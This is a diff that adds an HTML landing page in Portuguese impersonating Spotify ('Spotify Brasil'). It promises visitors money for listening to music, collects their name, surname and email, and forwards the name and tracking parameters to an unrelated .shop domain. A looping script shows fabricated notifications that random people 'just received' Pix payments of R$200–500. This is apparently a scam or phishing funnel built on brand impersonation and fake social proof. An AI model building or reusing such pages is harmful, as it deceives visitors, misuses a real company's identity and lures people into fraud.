@@ -1,0 +1,287 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify</title>
+    
+     <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+  window.pixelId = "6778a53312ce528775b29b64";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+    <!-- FONT GOOGLE POPPINS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            background-color: rgb(24, 24, 24);
+            justify-content: center; /* Centraliza horizontalmente */
+            align-items: center;    /* Centraliza verticalmente */
+          }
+          .centralizado {
+            width: 300px;
+            background-color: rgb(0, 0, 0);
+            text-align: center;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: 10px;
+          }
+          *{
+            font-family: "Poppins", sans-serif;
+            color: white;
+          }
+          #logocentral{
+            width: 90px;
+          }
+          #textoprincipalsptfy{
+            font-size: 23px;
+            font-weight: 700;
+          }
+          #descricaoiniciospotify{
+            color: rgb(168, 168, 168);
+            margin-top: -10px;
+            font-size: 15px;
+          }
+          #descricaoiniciospotifyy{
+            color: rgb(168, 168, 168);
+            font-size: 14px;
+            font-weight: 500;
+          }
+          #divisorlinha{
+            width: 95%;
+            height: 1px;
+            background-color: rgb(105, 105, 105);
+          }
+          #txtinputmeil{
+            color: rgb(168, 168, 168);
+          }
+          #logincadastro{
+            display: flex;
+            font-size: 15px;
+            width: 100%;
+            flex-direction: column;
+            text-align: left;
+          }
+          #inputcadastro, #nomeInput{
+            padding: 13px 10px;
+            color: rgb(168, 168, 168);
+            border-radius: 10px;
+            margin-top: 9px;
+            border: 1px solid rgb(168, 168, 168);
+            background-color: rgb(24, 24, 24);
+          }
+          #botaoprocximetapa{
+            padding: 13px 10px;
+            background-color: rgb(1, 214, 97);
+            color: white;
+            margin-top: 20px;
+            border-radius: 50px;
+            border: 1px solid rgb(1, 214, 97);
+            text-decoration: none;
+            width: 90%;
+            font-weight: 600;
+          }
+    </style>
+</head>
+<body>
+    <div class="centralizado">
+        <!-- IMAGEM DA LOGO -->
+        <img src="images/logowhite.png" id="logocentral">
+
+        <!-- TEXTO POP UP -->
+         <p id="textoprincipalsptfy">
+            Seja bem-vindo ao<br>Spotify Brasil
+         </p>
+
+         <!-- DESCRICAO -->
+          <p id="descricaoiniciospotify">
+            Faça seu <b>cadastro</b> e ganhe <br>dinheiro ouvindo músicas de <br>grandes artistas e ajude a moldar o futuro da música no Brasil!
+          </p>
+
+          <!-- DIVISOR -->
+           <!--<div id="divisorlinha"></div>-->
+
+           <!-- DADOS DE LOGIN -->
+            <div id="logincadastro">
+                <!--<p id="txtinputmeil">
+                    Insira seu melhor e-mail para cadastro
+                </p>-->
+                <input type="text" placeholder="Nome" id="nomeInput">
+                <input type="text" placeholder="Sobrenome" id="inputcadastro">
+                <input type="text" placeholder="Seu melhor e-mail aqui" id="inputcadastro">
+            </div>
+
+            <button onclick="redirecionar()" id="botaoprocximetapa">Cadastrar e ganhar</button>
+
+            
+<script>
+    function getQueryParams() {
+        const params = {};
+        const queryString = window.location.search.substring(1);
+        const pairs = queryString.split("&").filter(Boolean);
+
+        pairs.forEach(pair => {
+            const [key, value] = pair.split("=");
+            params[decodeURIComponent(key)] = decodeURIComponent(value || '');
+        });
+
+        return params;
+    }
+
+    function redirecionar() {
+        const nome = document.getElementById('nomeInput').value || 'null';
+
+        const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+        const currentParams = getQueryParams();
+
+        const queryParams = [];
+
+        // Adiciona o nome
+        queryParams.push(`nome=${encodeURIComponent(nome)}`);
+
+        // Adiciona os parâmetros UTM, se existirem, se não manda como null
+        utmParams.forEach(param => {
+            const value = currentParams[param] ? currentParams[param] : 'null';
+            queryParams.push(`${param}=${encodeURIComponent(value)}`);
+        });
+
+        const queryString = queryParams.join('&');
+
+        const proximaPagina = 'https://acessaragora.shop/preta/02/';
+        const urlFinal = `${proximaPagina}?${queryString}`;
+
+        window.location.href = urlFinal;
+    }
+</script>
+
+
+            <p id="descricaoiniciospotifyy">
+                Este site é protegido pelo reCAPTCHA e está sujeito à <b style="color: rgb(1, 214, 97); font-weight: 500;">Política de Privacidade</b> e aos <b style="color: rgb(1, 214, 97); font-weight: 500;">Termos de Serviço do Google.</b>
+            </p>
+      </div>
+
+
+
+
+
+
+      
+      
+      
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Notificação PIX</title>
+        <style>
+          /* Estilo da notificação */
+          .notification {
+            display: none;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: rgba(1, 214, 97, 0.368);
+            border: 1px solid rgb(1, 214, 97);
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            font-family: Arial, sans-serif;
+            opacity: 0;
+            transform: translateY(100%);
+            transition: all 0.5s ease;
+          }
+      
+          /* Animação de entrada */
+          .show {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+          }
+      
+          /* Animação de saída */
+          .hide {
+            opacity: 0;
+            transform: translateY(100%);
+          }
+        </style>
+      
+      
+      
+        <!-- Div da notificação -->
+        <div id="pixNotification" class="notification show">Karla acabou de receber R$ 409,33 no Pix</div>
+      
+        <script>
+          // Lista de 300 nomes
+          const nomes = [
+            "Ana", "Bruno", "Carlos", "Daniela", "Eduardo", "Fernanda", "Gabriel", "Helena", "Isabela", "João", 
+            "Karla", "Leonardo", "Mariana", "Nicolas", "Olívia", "Paulo", "Quintino", "Rafaela", "Sérgio", "Tatiana",
+            // Adicione mais nomes até ter 300...
+            "Ulisses", "Valéria", "Wilson", "Xavier", "Yara", "Zeca"
+          ];
+      
+          // Função para gerar um valor aleatório entre dois números
+          function getRandomValue(min, max) {
+            return Math.random() * (max - min) + min;
+          }
+      
+          // Função para selecionar um nome aleatório da lista
+          function getRandomName() {
+            return nomes[Math.floor(Math.random() * nomes.length)];
+          }
+      
+          // Função para mostrar a notificação
+          function showPixNotification() {
+            const nome = getRandomName();
+            const valor = getRandomValue(200, 500).toFixed(2).replace('.', ',');
+      
+            const mensagem = `${nome} acabou de receber R$ ${valor} no Pix`;
+            const notificationElement = document.getElementById("pixNotification");
+      
+            // Define a mensagem no HTML
+            notificationElement.innerHTML = mensagem;
+      
+            // Mostra a notificação com a animação
+            notificationElement.classList.add("show");
+      
+            // Oculta a notificação após um intervalo aleatório entre 3 e 5 segundos
+            const displayTime = getRandomValue(3000, 5000); // Entre 3000ms (3s) e 5000ms (5s)
+            setTimeout(function() {
+              notificationElement.classList.add("hide"); // Adiciona animação de saída
+      
+              // Remove a notificação completamente após a animação de saída
+              setTimeout(function() {
+                notificationElement.classList.remove("show", "hide");
+              }, 500); // Tempo da animação de saída
+            }, displayTime);
+          }
+      
+          // Mostrar a notificação repetidamente com intervalo
+          function startNotificationLoop() {
+            showPixNotification();
+            setInterval(showPixNotification, 7000); // A cada 7 segundos uma nova notificação
+          }
+      
+          // Inicia o loop de notificações ao carregar a página
+          window.onload = startNotificationLoop;
+        </script>
+      
+      
+      
+
+
+
+
+
+</body></html>
